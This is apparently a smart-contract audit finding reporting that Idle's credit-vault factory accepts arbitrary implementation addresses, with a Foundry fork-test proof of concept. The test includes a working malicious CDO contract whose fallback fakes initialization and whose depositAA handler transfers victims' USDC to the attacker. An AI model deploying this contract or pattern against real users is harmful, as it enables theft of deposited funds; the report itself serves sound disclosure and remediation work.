### Title
Unrestricted factory implementations let an unprivileged deployer install vault-exfiltrating code - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary

`deployCreditVault` and `deployRevolvingCreditVault` are permissionless, while their parameters include caller-selected CDO, strategy, queue, write-off escrow, and programmable-borrower implementation addresses. [1](#0-0) [2](#0-1) 

The factory places each supplied address directly behind a `TransparentUpgradeableProxy` and delegatecalls the factory-selected initializer into it, without checking that the implementation is an approved Idle contract. [3](#0-2) [4](#0-3) 

An attacker can therefore deploy a factory-emitted vault whose CDO implementation contains a fallback initializer and a malicious `depositAA` handler. A victim approval followed by `depositAA` transfers the victim’s underlying tokens directly to the attacker.

### Finding Description

`CreditVaultParams.implementation`, `StrategyData.implementation`, `AncillaryParams.queueImplementation`, `AncillaryParams.writeOffImplementation`, and `ProgrammableBorrowerParams.implementation` are all attacker-controlled deployment inputs. [1](#0-0) 

Neither deployment entry point restricts the caller, verifies implementation bytecode, nor consults an implementation registry. [2](#0-1) 

`_deployBaseCreditVault` delegatecalls `IdleCreditVault.initialize` into the supplied strategy implementation and `IdleCDOCreditVault.initialize` into the supplied CDO implementation. [3](#0-2) 

A malicious CDO implementation can silently accept the initializer and subsequent configuration calls through `fallback`, retain the configured underlying token, and later execute attacker-defined behavior when users call `depositAA`. [5](#0-4) [6](#0-5) 

The factory then transfers nominal ownership to the configured treasury and emits `CreditVaultDeployed`, making the malicious implementation externally indistinguishable from a factory-produced vault unless users inspect the implementation bytecode. [7](#0-6) 

### Impact Explanation

Every underlying token deposited into the malicious factory-deployed vault can be stolen. For a victim approving `X` tokens and calling `depositAA(X)`, the quantified loss is `X`.

The broken invariant is deployment trust isolation: the factory should only wrap known-safe implementations, but it accepts arbitrary executable code. This is closest to the report’s package-validation failure: the factory validates only that proxy construction and initialization do not revert, not that the supplied implementation is an approved vault artifact.

Existing vault, manager, borrower, Keyring, and epoch checks do not mitigate this path because the malicious code executes before those checks and can implement the expected entry-point signature itself.

### Likelihood Explanation

Any EOA or contract can call the deployment functions and supply a malicious implementation. [2](#0-1) 

Exploitation requires a victim to trust the emitted factory deployment and approve the returned CDO proxy. No malicious owner, manager, guardian, borrower, Keyring administrator, fee receiver, or queue is required.

### Recommendation

Maintain an on-chain allowlist of implementation bytecode hashes or implementation addresses and require every supplied implementation to be registered before deployment.

At minimum, check:

```solidity
if (!approvedImplementations[implementation]) revert NotAllowed();
```

Apply the check in `deployCreditVault`, `deployRevolvingCreditVault`, `_deployQueue`, `_deployWriteOffEscrow`, and `_deployProgrammableBorrower`. Deployment of new approved implementations should be restricted to the treasury or another explicitly trusted governance role.

### Proof of Concept

The following Foundry fork test deploys the real factory on a fork, supplies a legitimate strategy but a malicious CDO implementation, obtains a factory-emitted vault, and shows that a victim’s approved deposit is sent to the attacker:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOCreditVault} from "../contracts/IdleCDOCreditVault.sol";

contract MaliciousCDO {
    address private immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    fallback() external payable {
        if (msg.sig == IdleCDOCreditVault.initialize.selector) {
            // initialize(uint256,address,address,address,address,address,uint256):
            // argument 1 is the underlying token.
            assembly {
                sstore(0, calldataload(36))
            }
            return;
        }

        if (msg.sig == bytes4(keccak256("depositAA(uint256)"))) {
            uint256 amount = abi.decode(msg.data[4:], (uint256));
            address underlying;
            assembly {
                underlying := sload(0)
            }

            IERC20(underlying).transferFrom(msg.sender, attacker, amount);

            assembly {
                mstore(0, amount)
                return(0, 32)
            }
        }

        // Silently accept all factory configuration calls.
        assembly {
            return(0, 0)
        }
    }
}

contract FactoryArbitraryImplementationTest is Test {
    bytes32 internal constant DEPLOYED_SIG =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    IERC20 internal constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testFactoryDeploysMaliciousCDOAndStealsDeposit() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address attacker = makeAddr("attacker");
        address treasury = makeAddr("honestTreasury");
        address manager = makeAddr("honestManager");
        address borrower = makeAddr("honestBorrower");
        address victim = makeAddr("victim");

        ProxyAdmin factoryAdmin = new ProxyAdmin();
        ProxyAdmin productAdmin = new ProxyAdmin();

        IdleCreditVaultFactory factoryImplementation = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(factoryImplementation),
                    address(factoryAdmin),
                    abi.encodeCall(IdleCreditVaultFactory.initialize, (treasury, address(productAdmin)))
                )
            )
        );

        IdleCreditVault strategyImplementation = new IdleCreditVault();
        MaliciousCDO maliciousCDO = new MaliciousCDO(attacker);

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(maliciousCDO),
                limit: 0,
                underlying: address(USDC),
                apr: 0,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 hours,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: treasury,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImplementation),
                manager: manager,
                borrower: borrower,
                borrowerName: "Honest borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillaryParams);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        address deployedCDO;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == DEPLOYED_SIG) {
                (deployedCDO,,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
                break;
            }
        }
        assertTrue(deployedCDO != address(0));

        uint256 amount = 100_000e6;
        deal(address(USDC), victim, amount);

        vm.startPrank(victim);
        USDC.approve(deployedCDO, amount);
        (bool ok,) = deployedCDO.call(
            abi.encodeWithSignature("depositAA(uint256)", amount)
        );
        vm.stopPrank();

        assertTrue(ok);
        assertEq(USDC.balanceOf(victim), 0);
        assertEq(USDC.balanceOf(attacker), amount);
    }
}
```

Run with:

```bash
MAINNET_RPC_URL=<mainnet-rpc> forge test \
  --match-test testFactoryDeploysMaliciousCDOAndStealsDeposit
```

  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    (IdleCDOEpochVariant cv, IdleCreditVault strategy) =
      _deployBaseCreditVault(strategyData, cvParams);

  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
